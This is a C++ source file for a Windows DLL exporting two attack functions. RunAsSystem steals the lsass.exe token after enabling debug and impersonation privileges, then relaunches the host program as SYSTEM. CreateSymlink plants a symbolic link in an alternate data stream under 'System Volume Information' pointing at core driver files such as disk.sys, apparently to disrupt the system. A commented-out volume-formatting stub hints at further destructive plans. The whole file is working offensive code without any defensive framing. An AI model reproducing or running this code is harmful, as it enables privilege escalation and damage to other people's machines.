// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <wchar.h>
#include <TlHelp32.h>
#include <lmcons.h>
//include <vds.h>//will be used for formating
#include <random>
#pragma comment(lib, "Uuid.lib")
using namespace std;

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        return FALSE;
    }

    return TRUE;
}
string GenRandomStr(int lenght = 256) {
    string ret = "";
    char templ[] = "ABCDEFGHIJKLMNOPQRSTUVWYZ0123456789";

    srand(time(0));
    for (int i = 0; i <= lenght; i++) {
        /* std::default_random_engine generator;
         std::uniform_int_distribution<int> distribution(1, 35);*/

        int random = (rand() % 35);
        ret += templ[random];
    }
    return ret;
}
EXTERN_C{
__declspec(dllexport) int __cdecl RunAsSystem() {
    HANDLE t;
    /////////
    //look where the executable is exactly located
    HMODULE hm = GetModuleHandle(NULL);
    WCHAR exepath[MAX_PATH];
    GetModuleFileName(hm, exepath, MAX_PATH);
    //enable SeDebugPrivilege and SeImpersonatePrivilege because we will need them
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &t);
    if (!(SetPrivilege(t, SE_DEBUG_NAME, TRUE) && SetPrivilege(t, SE_IMPERSONATE_NAME, TRUE))) {
        //if there's an error then probably the user isn't an administrator so
        //we should return an error
        return ERROR_PRIVILEGE_NOT_HELD;
    }
    //we have the SeDebugPrivilege Enabled so opening the process with
    //PROCESS_ALL_ACCESS won't make a problem
    HANDLE hlsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindProcessId(L"lsass.exe"));
    HANDLE htok = nullptr;
    //I guess if MS changed lsass.exe token security descriptor with some explicite 
    //access, this won't work
    OpenProcessToken(hlsass, MAXIMUM_ALLOWED, &htok);
    HANDLE newtok = nullptr;
    DuplicateTokenEx(htok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newtok);
    STARTUPINFO inf = { 0 };
    PROCESS_INFORMATION pinf = { 0 };
    //CreateProcessWithToken require SeImpersonatePrivilege which was already enabled above
    //the function should work with no trouble
    if (!CreateProcessWithTokenW(newtok, LOGON_WITH_PROFILE, exepath, NULL,
        NULL, NULL, NULL, &inf, &pinf))
        return ERROR_ACCESS_DENIED;
    return ERROR_SUCCESS;
}
/*__declspec(dllexport) int __cdecl FormatVolume(std::string volume) {
    return 0;
}*///TODO
__declspec(dllexport) int __cdecl CreateSymlink(const char* drv,const char* target,bool random) {

    //even if it exist we must create anyway
    string sysv = drv;
    sysv += "\\System Volume Information";
    CreateDirectoryA(sysv.c_str(), nullptr);
    sysv += "\\IndexerVolumeGuid";
    HANDLE idv = CreateFileA(sysv.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, nullptr);
    CloseHandle(idv);
    sysv += ":";
    sysv += GenRandomStr(64);//I guess 64 is enough
    //I generated this list, those 
    string en[] = { "C:\\windows\\System32\\drivers\\acpi.sys",
    "C:\\Windows\\System32\\drivers\\pci.sys",
    "C:\\Windows\\System32\\drivers\\cdrom.sys",
    "C:\\Windows\\System32\\drivers\\volmgr.sys",
    "C:\\Windows\\System32\\drivers\\vdrvroot.sys",
    "C:\\Windows\\System32\\drivers\\spaceport.sys",
    "C:\\Windows\\System32\\drivers\\spaceport.sys",
    "C:\\Windows\\System32\\drivers\\disk.sys",
    };
    srand(time(0));// you know to generate a random number
    if (random) {
        CreateSymbolicLinkA(sysv.c_str(), en[rand() % 7/*array size is 8*/].c_str(), 0);
        return GetLastError();
    }
    CreateSymbolicLinkA(sysv.c_str(), target, 0);
    return GetLastError();
    return 0;
}
}




BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

